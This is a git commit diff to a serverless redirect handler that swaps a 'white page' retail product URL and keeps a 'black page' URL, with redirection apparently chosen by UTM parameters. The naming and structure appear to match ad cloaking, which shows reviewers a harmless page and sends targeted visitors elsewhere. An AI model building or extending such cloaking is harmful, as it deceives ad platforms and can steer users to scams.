f1dbe63fc639183a98385825e7c92d72866451ad
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-14 03:14:46 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.madbagstore.com/en-en/products/tote-diva-blu-navy";
+    const whitePageURL = "https://www.popphones.com.au/shop/stm-gan-35w-dual-port-usb-c-power-adapter/";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
